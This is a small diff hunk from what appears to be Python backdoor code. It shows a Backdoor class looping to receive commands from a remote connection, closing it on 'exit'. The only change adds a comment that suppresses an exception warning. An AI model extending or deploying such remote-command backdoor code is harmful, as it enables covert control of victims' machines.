@@ -49,6 +49,7 @@ class Backdoor:
         while True:
             command = self.reliable_receive()
 
+            # noinspection PyBroadException
             try:
                 if command[0] == "exit":
                     self.connection.close()
